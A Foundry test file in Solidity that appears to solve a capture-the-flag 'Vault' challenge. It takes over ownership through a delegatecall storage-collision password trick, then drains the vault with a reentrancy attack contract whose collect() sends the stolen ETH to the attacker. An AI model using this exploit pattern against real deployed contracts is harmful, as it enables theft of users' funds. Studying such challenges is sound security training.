// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        bytes32 password = bytes32(uint256(uint160(address(logic))));

        // 构造调用数据
        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", password, palyer);
        (bool success,) = address(vault).call(data);
        require(success, "changeOwner failed");

        vault.openWithdraw();

        ReentrancyAttack attack = new ReentrancyAttack(address(vault));

        uint256 vaultBalance = address(vault).balance/100;
        attack.deposite{value: vaultBalance}();
        attack.attack();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}

contract ReentrancyAttack {
    Vault public vault;
    address public owner;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = Vault(payable(_vault));
        owner = msg.sender;
    }

    function deposite() external payable {
        vault.deposite{value: msg.value}();
    }

    // 攻击入口：存款 + 触发提款
    function attack() external payable {
        vault.withdraw(); // 首次提款，触发重入
    }

    // 接收 ETH 时递归调用 withdraw()
    receive() external payable {
        //console.log("vault balance:", address(vault).balance); && attackCount < 10
        if (address(vault).balance > 0 ether) {
            attackCount++;
            vault.withdraw(); // 重入攻击
        }
    }

    // 提取盗取的 ETH
    function collect() external {
        payable(owner).transfer(address(this).balance);
    }
}